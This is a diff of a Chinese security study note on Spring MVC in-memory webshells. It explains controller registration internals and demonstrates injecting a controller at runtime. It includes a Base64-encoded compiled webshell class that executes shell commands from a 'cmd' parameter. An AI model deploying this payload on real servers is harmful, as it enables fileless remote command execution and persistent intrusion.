@@ -23,6 +23,8 @@
 
 `DispatcherServlet` 是 Spring MVC 框架的核心组件之一，本质上是一个 Servlet, 它负责将 HTTP 请求分发到相应的处理器（如 Controller）
 
+> ![img](http://cdn.ayusummer233.top/DailyNotes/202410211358362.png)
+
 - 主要职责
 
   - **初始化**：在应用启动时，`DispatcherServlet` 会被初始化，并加载 Spring 应用上下文（ApplicationContext），从而初始化所有的 Spring Bean，包括 Controller、Service、Repository 等
@@ -47,7 +49,10 @@
 ## 环境配置
 
 - 部署环境: `tomcat:8` Docker(`jdk21.0.2`)
-- 开发环境: `jdk21.0.2` + `maven 3.9.9`
+
+- 开发环境: `jdk21.0.2` + `maven 3.9.9` + `jdk1.8.0_121`
+
+  本节的项目代码: [DailyNotesCode/Security/Web/MemShell/Java/SpringMVC/spring-webmvc-memshell at main · 233Official/DailyNotesCode (github.com)](https://github.com/233Official/DailyNotesCode/tree/main/Security/Web/MemShell/Java/SpringMVC/spring-webmvc-memshell)
 
 ---
 
@@ -361,6 +366,10 @@ public class IndexController {
 >
 > [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#spring-controller-内存马)
 
+---
+
+### 动态注册 Controller
+
 在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping
 
 在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。这里使用 spring-webmvc-5.2.3 进行调试。
@@ -381,6 +390,142 @@ SpringMVC 初始化时，在每个容器的 bean 构造方法、属性设置之�
 这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 `processCandidateBean` 方法处理 Bean。
 
 ![img](http://cdn.ayusummer233.top/DailyNotes/202410181802725.png)
+
+`processCandidateBean` 方法
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202410211124908.png)
+
+`isHandler` 方法判断当前 bean 定义是否带有 Controller 或 RequestMapping 注解。
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202410211125866.png)
+
+`detectHandlerMethods` 查找 handler methods 并注册。
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202410211127861.png)
+
+正如上面提到的 `在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射`, **这部分有两个关键功能，一个是 `getMappingForMethod` 方法根据 handler method 创建RequestMappingInfo 对象，一个是 `registerHandlerMethod` 方法将 handler method 与访问的 创建 RequestMappingInfo 进行相关映射**。
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202410211130567.png)
+
+这里我们看到，是调用了 MappingRegistry 的 register 方法，这个方法将一些关键信息进行包装、处理和储存
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202410211131768.png)
+
+关键信息储存位置如下：
+
+![img](http://cdn.ayusummer233.top/DailyNotes/202410211329700.png)
+
+以上就是整个注册流程
+
+---
+
+然后来看一次请求进来时的查找流程
+
+在 AbstractHandlerMethodMapping 的 lookupHandlerMethod 方法：
+
+- 在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos
+- 如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos
+- 获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod
+
+上述的流程和较详细的流程描述在 [SpringMVC源码之Controller查找原理 - 卧颜沉默 - 博客园 (cnblogs.com)](https://www.cnblogs.com/w-y-c-m/p/8416630.html) 中可以查看
+
+---
+
+那接下来就是动态注册 Controller 了，LandGrey 师傅在 [基于内存 Webshell 的无文件攻击技术研究 - LandGrey's Blog](https://landgrey.me/blog/12/) 中列举了几种可用来添加的接口，其实[本章](https://su18.org/post/memory-shell/#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC)上都是调用之前我们提到的 MappingRegistry 的 register 方法。
+
+和 Servlet 的添加较为类似的是，重点需要添加的就是访问 url 与 RequestMappingInfo 的映射，以及是 RequestMappingInfo 与 HandlerMethod 的映射。
+
+[这里我](https://su18.org/post/memory-shell/#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC)不会使用 LandGrey 师傅提到的接口，而是直接使用 MappingRegistry 的 register 方法来添加，当然，同样可以通过自己实现逻辑，通过反射直接写进重要位置，不使用 Spring 提供的接口。
+
+---
+
+### Base64字符串加载为Class
+
+> [MemoryShell/memshell-spring/src/main/java/org/su18/memshell/spring/controller/DynamicUtils.java at main · su18/MemoryShell (github.com)](https://github.com/su18/MemoryShell/blob/main/memshell-spring/src/main/java/org/su18/memshell/spring/controller/DynamicUtils.java)
+
+编写一个将 Base64 编码的 class 字符串解析生成对应 class 对象的函数
+
+![image-20241021141422734](http://cdn.ayusummer233.top/DailyNotes/202410211414878.png)
+
+顺便可以看一下 su18 师傅这里的这个 SpringController Base64 对应的 class:
+
+![image-20241021142101303](http://cdn.ayusummer233.top/DailyNotes/202410211421416.png)
+
+---
+
+### 编写动态注册 Controller 方法
+
+> [MemoryShell/memshell-spring/src/main/java/org/su18/memshell/spring/controller/AddController.java at main · su18/MemoryShell (github.com)](https://github.com/su18/MemoryShell/blob/main/memshell-spring/src/main/java/org/su18/memshell/spring/controller/AddController.java)
+
+![image-20241021142449969](http://cdn.ayusummer233.top/DailyNotes/202410211424067.png)
+
+![image-20241021142501401](http://cdn.ayusummer233.top/DailyNotes/202410211425490.png)
+
+---
+
+### 看看 su18 师傅的原生代码效果
+
+正常访问 indexController:
+
+![image-20241021144253673](http://cdn.ayusummer233.top/DailyNotes/202410211442797.png)
+
+动态添加 Controller: `/add`
+
+![image-20241021144335993](http://cdn.ayusummer233.top/DailyNotes/202410211443106.png)
+
+---
+
+访问添加的 Controller: `/su18`
+
+![image-20241021144414681](http://cdn.ayusummer233.top/DailyNotes/202410211444764.png)
+
+---
+
+### 注入恶意Controller
+
+编写恶意 Controller:
+
+![image-20241021150422289](http://cdn.ayusummer233.top/DailyNotes/202410211504445.png)
+
+连着项目一期编译， 取出这个类的 class [编码为 Base64 字符串](https://github.com/233Official/DailyNotesCode/blob/main/Java/CommonUse/Encode/Base64/ClassToBase64/ClassToBase64.java):
+
+![image-20241021151031388](http://cdn.ayusummer233.top/DailyNotes/202410211510524.png)
+
+```
+yv66vgAAADQAqAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAIXRoaXMgaXMgYSBTdW1tZXJDb250cm9sbGVyQ01EPGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbggAIAEAA2NtZAsAIgAjBwAkDAAlACYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHACgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHACoBABBqYXZhL2xhbmcvU3RyaW5nCAAsAQAGd2hvYW1pCgAnAC4MAAUALwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYKACcAMQwAMgAzAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsKADUANgcANwwAOAA5AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07BwA7AQARamF2YS91dGlsL1NjYW5uZXIKADoAPQwABQA+AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCABAAQACXGEKADoAQgwAQwBEAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CgA6AEYMAEcASAEAB2hhc05leHQBAAMoKVoKADoASgwASwBMAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CABOAQAACABQAQABXAoAKQBSDABTAFQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgoAOgBWDABXAAYBAAVjbG9zZQcAWQEAE2phdmEvbGFuZy9UaHJvd2FibGUKAFgAWwwAXABdAQANYWRkU3VwcHJlc3NlZAEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVggAXwEAAnNoCABhAQACLWMIAGMBAAdjbWQuZXhlCABlAQACL2MKAGcAaAcAaQwAagBrAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBnAG0MAG4AbwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgAbAHEMAHIABgEABWZsdXNoCgAbAFYHAHUBABNqYXZhL2xhbmcvRXhjZXB0aW9uCgB0AHcMAHgABgEAD3ByaW50U3RhY2tUcmFjZQcAegEALWNvbS9zdW1tZXJ5MjMzL2NvbnRyb2xsZXIvU3VtbWVyQ29udHJvbGxlckNNRAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAvTGNvbS9zdW1tZXJ5MjMzL2NvbnRyb2xsZXIvU3VtbWVyQ29udHJvbGxlckNNRDsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAhvdXRwdXRPUwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACXNjYW5uZXJPUwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAA5yZXNwb25zZVdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEABm91dHB1dAEAAXMBAAdpc0xpbnV4AQABWgEAEHByb2Nlc3NCdWlsZGVyT1MBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEACXByb2Nlc3NPUwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAARpbk9TAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEABHZhcjUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAnQEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAJMBAApFeGNlcHRpb25zAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEANExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vR2V0TWFwcGluZzsBAApTb3VyY2VGaWxlAQAYU3VtbWVyQ29udHJvbGxlckNNRC5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmc7AQAFdmFsdWUBABQvc3VtbWVyQ29udHJvbGxlckNNRAAhAHkAAgAAAAAAAgABAAUABgABAHsAAAAvAAEAAQAAAAUqtwABsQAAAAIAfAAAAAYAAQAAABAAfQAAAAwAAQAAAAUAfgB/AAAAAQCAAIEAAwB7AAAD+wAGAA8AAAFwLBIHuQAJAgAsEg+5ABECACy5ABQBABIYtgAaKxIfuQAhAgBOLcYBQgQ2BLsAJ1kEvQApWQMSK1O3AC06BRkFtgAwOgYZBrYANDoHuwA6WRkHtwA8Ej+2AEE6CBkItgBFmQALGQi2AEmnAAUSTToJGQkST7YAUZkABgM2BBkIxgAmGQi2AFWnAB46CRkIxgAUGQi2AFWnAAw6ChkJGQq2AFoZCb8VBJkAGAa9AClZAxJeU1kEEmBTWQUtU6cAFQa9AClZAxJiU1kEEmRTWQUtUzoIuABmGQi2AGy2ADQ6CbsAOlkZCbcAPBI/tgBBOgoZCrYARZkACxkKtgBJpwAFEk06Cyy5ABQBADoMGQwZC7YAGhkMtgBwGQzGACYZDLYAc6cAHjoNGQzGABQZDLYAc6cADDoOGQ0ZDrYAWhkNvxkKxgAmGQq2AFWnAB46CxkKxgAUGQq2AFWnAAw6DBkLGQy2AFoZC7+nAAhOLbYAdrEABwBbAHwAiQBYAJAAlQCYAFgBCwEXASQAWAErATABMwBYAO8BPwFMAFgBUwFYAVsAWAAAAWcBagB0AAMAfAAAAH4AHwAAABQACAAVABAAFgAbABgAJAAZACgAGgArABsAPQAcAEQAHQBLAB4AWwAfAG8AIQB5ACIAfAAkAIkAHgCkACUAvgAmANIAJwDfACgA7wApAQMAKgELACsBEgAsARcALQEkACoBPwAuAUwAKAFnADIBagAwAWsAMQFvADMAfQAAAKIAEABvAA0AggCDAAkAWwBJAIQAhQAIAQsANACGAIcADAEDADwAiACDAAsA7wB4AIkAhQAKACsBPACKAIsABAA9ASoAjACNAAUARAEjAI4AjwAGAEsBHACQAJEABwDSAJUAkgCTAAgA3wCIAJQAkQAJACQBQwAgAIMAAwFrAAQAlQCWAAMAAAFwAH4AfwAAAAABcACXAJgAAQAAAXAAmQCaAAIAmwAAARUAFf8AawAJBwB5BwAiBwAKBwApAQcAJwcANQcAnAcAOgAAQQcAKQ5MBwBY/wAOAAoHAHkHACIHAAoHACkBBwAnBwA1BwCcBwA6BwBYAAEHAFgI+QACGVEHAJ7+AC4HAJ4HAJwHADpBBwAp/wAiAA0HAHkHACIHAAoHACkBBwAnBwA1BwCcBwCeBwCcBwA6BwApBwAbAAEHAFj/AA4ADgcAeQcAIgcACgcAKQEHACcHADUHAJwHAJ4HAJwHADoHACkHABsHAFgAAQcAWAj4AAJMBwBY/wAOAAwHAHkHACIHAAoHACkBBwAnBwA1BwCcBwCeBwCcBwA6BwBYAAEHAFgI/wACAAMHAHkHACIHAAoAAEIHAHQEAJ8AAAAEAAEAdACgAAAABgABAKEAAAACAKIAAAACAKMAoAAAABIAAgCkAAAApQABAKZbAAFzAKc=
+```
+
+对应改下注册代码:
+
+![image-20241021152555489](http://cdn.ayusummer233.top/DailyNotes/202410211525621.png)
+
+> 需要注意的是之前做 Tomcat 内存马时写的恶意类不会实际注册到应用中, 因为没在 web.xml 或者注解配置路由
+>
+> 这里写的恶意类连着项目编译的话是能够成功注册的, 所以要测试内存马的话记得把这个类文件移出去
+
+编译部署看下:
+
+![image-20241021153106150](http://cdn.ayusummer233.top/DailyNotes/202410211531279.png)
+
+> 如果没把恶意类移出去会提示路由已存在
+>
+> ![image-20241021153148253](http://cdn.ayusummer233.top/DailyNotes/202410211531355.png)
+
+`/add`:
+
+![image-20241021155537463](http://cdn.ayusummer233.top/DailyNotes/202410211555580.png)
+
+`/summerControllerCMD?cmd=id`:
+
+![image-20241021155648462](http://cdn.ayusummer233.top/DailyNotes/202410211556558.png)
+
+---
+
+
+
+
+
+
 
 
 
